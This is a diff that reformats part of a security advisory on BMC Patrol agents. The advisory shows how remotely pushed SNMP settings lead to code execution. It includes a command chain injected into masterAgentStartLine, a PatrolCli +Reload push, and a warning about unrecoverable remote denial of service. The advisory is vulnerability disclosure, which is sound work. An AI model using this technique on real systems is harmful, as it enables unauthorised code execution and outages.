@@ -37,19 +37,19 @@ For Windows:
 "/snmp/masterAgentDir" = { REPLACE="bin/../../../Windows/system32/" },
 ```
 
-Do note that the masterAgentDir is relative and depends on Patrol's installation path. Usually this is under C:\BMC.
+Do note that the ```masterAgentDir``` path is relative and depends on Patrol's installation path. Usually this is under C:\BMC.
 
 On Linux systems (according to my old notes, YMMV) it's a different parameter that leads to code execution:
 ```
 "/snmp/masterAgentStartLine" = { REPLACE="/usr/bin/touch /tmp/snmp ; /usr/bin/touch /tmp/snmp2 & #" },
 ```
 
-The configuration is pushed using the +Reload directive:
+The configuration is pushed using the ```+Reload``` directive:
 ```
 PatrolCli -host xxx +Reload /tmp/my_config
 ```
 
-To maximize chances of success, only the new SNMP configuration should be pushed. Remotely overwriting other parts of the configuration may result in an *unrecoverable* remote DoS.
+To maximize chances of success, only the new SNMP configuration should be pushed. Remotely overwriting other parts of the configuration may result in an **unrecoverable** remote DoS.
 
 The agent needs to be remotely restarted for the modification to take effect:
 ```
@@ -62,7 +62,7 @@ According to the editor these are not a vulnerabilities.
 
 Timeline
 --------
-2021: Vulnerabilities discovered
-2023-01: Editor contacted
-2023-02: Editor ACK
+2021: Vulnerabilities discovered  
+2023-01: Editor contacted  
+2023-02: Editor ACK  
 2023-05: FD
